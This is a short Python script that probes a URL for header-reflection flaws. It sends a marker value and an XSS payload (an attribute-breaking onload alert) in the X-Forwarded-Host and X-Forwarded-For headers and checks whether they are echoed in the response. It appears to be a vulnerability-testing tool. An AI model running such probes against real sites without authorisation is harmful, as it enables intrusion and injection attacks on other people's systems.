from pprint import pprint

import requests

payload = 'kek.kek'
xss_payload = 'kek.kek"onload="alert();'


def check(url, xss=False):
    """
    Payload found in response
    :param url:
    :return:
    """
    try:
        if not xss:
            return True if requests.get(url, headers={
                'X-Forwarded-Host': payload,
                'X-Forwarded-For': payload,
            }).text.find(payload) > -1 else False
        if xss:
            return True if requests.get(url, headers={
                'X-Forwarded-Host': xss_payload,
                'X-Forwarded-For': xss_payload,
            }).text.find(
                xss_payload) > -1 else False
    except Exception as ex:
        pprint(ex)
    return False
